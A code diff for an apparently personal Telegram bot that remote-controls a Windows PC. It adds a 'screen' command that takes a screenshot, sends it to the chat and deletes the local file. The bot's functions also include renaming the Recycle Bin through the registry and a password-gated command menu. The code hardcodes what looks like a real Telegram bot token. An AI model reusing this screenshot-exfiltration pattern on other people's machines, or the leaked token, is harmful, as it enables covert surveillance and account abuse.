@@ -2,6 +2,7 @@ import telebot
 import os
 import winreg
 import pyautogui
+import time
 
 class Bot:
     def __init__(self, bot=telebot.TeleBot('6941701570:AAHp7l4D4edCVHvh7-UdDKT5mD5rZXnQ54s')):
@@ -17,6 +18,21 @@ class Bot:
         pyautogui.keyDown('win')
         pyautogui.press('d')
         pyautogui.keyUp('win')
+
+    def screen(self, message):
+        pyautogui.keyDown('win')
+        pyautogui.press('printscreen')
+        pyautogui.keyUp('win')
+        time.sleep(5)
+        dir_name = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Pictures\\Screenshots")
+        filse = os.listdir(dir_name)
+        for i in filse:
+            if i.find('Снимок экрана') != -1:
+                bot.send_photo(message.chat.id, open(os.path.join(dir_name, i), 'rb'))
+                os.remove(os.path.join(dir_name, i))
+                break
+        return True
+
 
     def rename(self, name):
         location = winreg.HKEY_CURRENT_USER
@@ -47,7 +63,8 @@ class Bot:
                                                   "\n 3:закрыть все:close_all"
                                                   "\n 4:пароь:4321"
                                                   "\n 5:отправь фото и оно сохранится на рабочий стол:*просто отправь фото*"
-                                                  "\n 6:сменить пароль:repar")
+                                                  "\n 6:сменить пароль:repar"
+                                                  "\n 7:снимок экрана:screen")
                 return True
             if command[1][0] == 'rename_trash':
                 self.rename(command[1][1])
@@ -65,6 +82,8 @@ class Bot:
             if command[1][0] == 'repar':
                 self.code = command[1][1]
                 return True
+            if command[1][0] == 'screen':
+                return self.screen(message)
 bot_bot = Bot()
 bot = bot_bot.bot
 
